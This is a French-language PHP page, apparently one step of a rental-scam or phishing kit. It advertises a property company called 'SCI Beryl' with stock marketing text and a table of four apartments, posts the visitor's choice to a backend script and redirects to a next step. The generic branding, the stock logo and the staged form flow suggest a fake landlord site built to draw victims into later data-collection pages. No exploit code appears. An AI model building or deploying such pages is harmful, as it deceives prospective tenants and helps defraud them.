<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">
<?php include("../common/header.php")  ?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        .progressbar > div{
            width: 25%;
        }

        .container{
            width : 95% !important;
        }


    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <title>Bienvenue</title>
</head>
<style>
                    .panel-heading{
                    border-bottom : 2px solid #3A3E41 !important

                }
                span{
                    color : #3A3E41 !important;
                }
                .btn-xl,.styled-table thead tr,.btn-primary{
                    background-color : #3A3E41 !important;
                }
</style>
<body>

<div class="row" style="display: flex; background: #3A3E41 none repeat scroll 0% 0%; margin-bottom: 30px;">
        <?php include("../common/head.php"); ?>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li class="active"></li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">
    <form action="" method="POST">
        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url('') no-repeat;">
                    <div class="panel-heading" style="padding:5px">
                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Bienvenue</h2>
                    </div>

                    <div class="panel-body">
                   

                        <style>
                            .styled-table {
                            border-collapse: collapse;
                            margin: 25px 0;
                            font-size: 0.9em;
                            font-family: sans-serif;
                            width: 100%;
                            border-radius:6px;
                            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
                            }
                            
                            .styled-table thead tr {
                            background-color: #009879;
                            color: #ffffff;
                            text-align: left;
                            }
                            
                            .styled-table th,
                            .styled-table td {
                            padding: 12px 15px;
                            }
                            .styled-table tbody tr {
                            border-bottom: 1px solid #dddddd;
                            }
                            
                            .styled-table tbody tr:nth-of-type(even) {
                            background-color: #f3f3f3;
                            }
                            
                            .styled-table tbody tr:last-of-type {
                            border-bottom: 2px solid #009879;
                            }
                            .styled-table tbody tr.active-row {
                            font-weight: bold;
                            color: #009879;
                            }
                        </style>

                        <div class="row">
                            <div class="col-md-7">
                                <div class="col-md-12">
                                    <strong>SCI Beryl</strong> et ses 170 hébergements accueillent depuis 2002 les familles dans leurs projets immobilier.<br><br>
Le groupe, partenaire de promoteurs d'envergure nationale, est présent sur tout le territoire avec <strong>8 cabinets spécialisés en gestion de patrimoine.</strong>
<br>
« SCI Beryl, plus que des réponses, des solutions ! »
<br>
<br>
<strong>Pourquoi nous choisir ?</strong><p> En 2022, SCI Beryl obtient le label 
<span style="color: skyblue; background: rgba(0, 0, 0, 0.0)!important;">#happyatwork</span> 
décerné par l'ensemble de ses collaborateurs sur la Qualité de Vie au Travail.
Nos collaborateurs témoignent :
"Une entreprise avec de vraies valeurs familiales, d'entraides et une bonne humeur quotidienne !"
<br>
<br>
Nous avons à cœur de partager nos valeurs avec vous, c’est avec ces principes que nous vous accueillerons.
<br>
<br>
Afin de poursuivre son développement, SCI Beryl recherche de nouveau locataire pour les logements suivants :
                                    <table class="styled-table">
                                            <thead>
                                                <tr>
                                                    <th></th>
                                                    <th>Appartement</th>
                                                    <th>Ville</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td style="text-align:">
                                                        <input type="radio" name="appartement" value="Appartement 63m2 - T3 Bordeaux">
                                                    </td>
                                                    <td style="text-align:">
                                                        Appartement 63m2 - T3
                                                    </td>
                                                    <td style="text-align:">
                                                        Bordeaux
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td>
                                                        <input type="radio" name="appartement" value="Appartement 72m2 - T4 Toulouse">
                                                    </td>
                                                    <td>
                                                        Appartement 72m2 - T4
                                                    </td>
                                                    <td>
                                                        Toulouse
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td>
                                                        <input type="radio" name="appartement" value="Appartement 79m2 - T3 Doubai">
                                                    </td>
                                                    <td>
                                                        Appartement 79m2 - T3
                                                    </td>
                                                    <td>
                                                        Doubai
                                                    </td>
                                                </tr>
                                                <tr style="border-color: #3A3E41;">
                                                    <td>
                                                        <input type="radio" name="appartement" value="Appartement 81m2 - T5 Marseille">
                                                    </td>
                                                    <td>
                                                        Appartement 81m2 - T5
                                                    </td>
                                                    <td>
                                                        Marseille
                                                    </td>
                                                </tr>
                                                
                                            </tbody>
                                        </table>
                                
                                </div>
                                    
                                </div>

                                <div class="col-md-12">

                                    <button type="submit" id="submit" class="btn btn-primary">Suivant</button>

                                    <br><br>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <br><br>
        </form>
    </main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://static.vecteezy.com/ti/vecteur-libre/p1/2228877-immobilier-logo-design-entreprise-signe-logo-vecteur-gratuit-vectoriel.jpg">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>
    <script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>
    <script>


        $(document).ready(function() {
                    $("form").submit(function(e) {
                        e.preventDefault();
                        var $this = $(this);
                        $("#loading").css("display", "block");
                        $.ajax({
                                method: "POST",
                                url: "../actions/choix.php",
                                data: $this.serialize()
                            })
                            .done(function(msg) {
                                setTimeout(function() {
                                    window.location.href = "avoir.php";
                                }, 2000);
                            });
                        
        
                    });
                });
    </script>

</body>
<style>
           @media (max-width: 430px) {
            .styled-table{
                width: 100% !important;;
            }
            .col-md-7{
                padding-right : 0 !important;
                padding-left : 0 !important;
            }
            .styled-table img{
                width : 50px !important;
            }

            .styled-table td{
                padding-right : 5px !important;
                padding-left :5px !important;
            }

        }

        @media (max-width: 350px) {
            .styled-table{
                width: 100% !important;;
            }
            .col-md-7{
                padding-right : 0 !important;
                padding-left : 0 !important;
            }
            .styled-table img{
                width : 30px !important;
            }

            .styled-table td{

                padding-right : 0px !important;
                padding-left :0px !important;
            }

        }
</style>

</html>